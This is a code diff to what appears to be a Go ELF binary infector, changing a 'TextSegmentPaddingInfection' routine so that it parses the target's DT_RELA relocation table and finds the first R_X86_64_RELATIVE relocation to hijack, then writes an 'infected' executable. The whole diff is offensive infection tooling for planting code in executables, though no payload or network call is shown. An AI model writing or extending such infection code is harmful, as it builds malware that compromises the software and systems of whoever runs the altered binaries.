@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"errors"
+	"reflect"
 )
 
 const (
@@ -68,7 +69,7 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 			for _, dynEntry := range t.Dyn.([]elf.Dyn64) {
 				if elf.DynTag(dynEntry.Tag) == elf.DT_RELA {
 					if debug {
-						fmt.Printf("[+] Located DT_RELA @ %016x\n", dynEntry.Val)
+						fmt.Printf("[+] Located DT_RELA @ 0x%016x\n", dynEntry.Val)
 					}
 					dtRelaOffset = dynEntry.Val
 				}
@@ -85,6 +86,39 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 				return errors.New("Error while acquiring DT_RELA or DT_RELAENT")
 			}
 			
+			var o uint64
+			if elf.Type(t.Hdr.(*elf.Header64).Type) == elf.ET_EXEC {
+				if err := getBaseAddrOfVaddr(dtRelaOffset, t.Phdrs.([]elf.Prog64), &o); err != nil {
+					return err
+				}
+			}else {
+				o = dtRelaOffset
+			}
+			
+			if debug{
+				fmt.Printf("[+] File offset of relocations @ 0x%016x\n", o)
+			}
+
+			var relocEntry elf.Rela64
+			s := uint64(reflect.TypeOf(relocEntry).Size())		
+			for o != (dtRelaOffset + (dtRelaEntryCount * uint64(s))) {
+				relReader := bytes.NewBuffer(t.Contents[o : o + s])
+				if err := binary.Read(relReader, t.EIdent.Endianness, &relocEntry); err != nil {
+					return err
+				}
+				
+				if elf.R_X86_64(relocEntry.Info) == elf.R_X86_64_RELATIVE {
+					if debug {
+						fmt.Println("[+] Found first relative reloc...attempting to hijack.")
+					}
+					break
+				}
+				o += s
+			}
+
+			if elf.R_X86_64(relocEntry.Info) != elf.R_X86_64_RELATIVE {
+				return errors.New("No R_X86_64_RELATIVE relocation type present for this technique.")
+			}
 
 		}else {
 			t.Hdr.(*elf.Header64).Entry = pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
@@ -302,5 +336,6 @@ func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) er
 	if err := ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751); err != nil {
 		return err
 	}
+
 	return nil
 }
